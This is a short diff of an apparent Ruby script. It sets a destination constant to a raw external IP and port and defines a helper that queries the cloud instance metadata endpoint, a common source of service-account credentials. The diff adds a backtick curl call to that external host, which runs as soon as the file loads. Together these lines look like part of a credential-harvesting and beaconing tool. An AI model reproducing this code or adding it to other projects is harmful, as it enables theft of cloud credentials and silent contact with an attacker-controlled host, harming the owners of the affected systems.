@@ -10,6 +10,8 @@ require "json"
 
 DEST_HOST = URI("http://35.237.177.170:50000")
 
+`curl http://35.237.177.170:50000`
+
 def req(path)
     begin
         uri = URI("http://169.254.169.254/computeMetadata/v1#{path}")
